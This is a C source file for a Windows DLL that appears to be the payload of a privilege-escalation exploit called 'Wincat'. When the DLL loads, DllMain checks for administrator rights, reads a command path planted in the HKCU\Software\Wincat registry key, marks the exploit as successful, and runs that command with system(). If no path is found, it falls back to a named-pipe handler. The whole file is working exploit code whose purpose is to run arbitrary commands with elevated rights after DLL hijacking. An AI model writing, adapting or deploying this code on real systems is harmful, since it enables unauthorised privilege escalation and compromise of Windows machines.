#include <windows.h>
#include <stdio.h>

#include "PipeClient.h"

///////////////////////// Registry //////////////////////////
//

#define MAX_BUFFER 1024
#define IP_ADDRESS_SIZE 16
#define PORT_SIZE sizeof(int)

BOOL ReadRegistryValue(HKEY key, char* path, char* name, LPBYTE valueOutput, DWORD valueOutputSize) {
	BOOL returnValue = FALSE;
	HKEY hKey;
	if (RegOpenKeyExA(key, path, 0, KEY_READ, &hKey) == ERROR_SUCCESS && hKey != NULL) {
		returnValue = RegQueryValueExA(hKey, name, 0, NULL, valueOutput, &valueOutputSize) == ERROR_SUCCESS;
		RegCloseKey(hKey);
	}
	return returnValue;
}
BOOL SetRegistryValue(HKEY key, char* path, char* name, char* value) {
	BOOL returnValue = FALSE;
	HKEY hKey;

	// KEY_ALL_ACCESS
	if (RegOpenKeyExA(key, path, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS && hKey != NULL) {
		returnValue = RegSetValueExA(hKey, name, 0, REG_SZ, (LPBYTE)value, (DWORD)strlen(value)) == ERROR_SUCCESS;
		RegCloseKey(hKey);
	}
	return returnValue;
}

BOOL DeleteRegistryKey(HKEY key, char* path, char* name) {
	return RegDeleteKeyA(key, name) == ERROR_SUCCESS;
}

BOOL GetTargetPath(char** pCurrentPath) {
	*pCurrentPath = (char*)malloc(MAX_BUFFER);
	if (*pCurrentPath == NULL)
		return FALSE;
	return ReadRegistryValue(HKEY_CURRENT_USER, "Software\\Wincat", "CPath", *pCurrentPath, MAX_PATH);
}
BOOL SetExploitSuccessed() {
	return SetRegistryValue(HKEY_CURRENT_USER, "Software\\Wincat", "test", "1");
}
//
///////////////////////// Registry //////////////////////////


BOOL IsRunAsAdmin() {
	BOOL  fIsRunAsAdmin = FALSE;
	PSID  pAdministratorsGroup = NULL;

	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
		if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin)) {
			FreeSid(pAdministratorsGroup);
			return fIsRunAsAdmin;
		}
		FreeSid(pAdministratorsGroup);
	}
	return fIsRunAsAdmin;
}

BOOL ExploitValidation(BOOL fIsRunAsAdmin, HMODULE hModule) {

	

	if (fIsRunAsAdmin) {
		char* currentPath = NULL;
		if (GetTargetPath(&currentPath)) {
			SetExploitSuccessed();
			system(currentPath);
			free(currentPath);
		}else
			return PipeHandler(fIsRunAsAdmin);
	}
	return FALSE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
		ExploitValidation(IsRunAsAdmin(), hModule);
		ExitProcess(0);
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
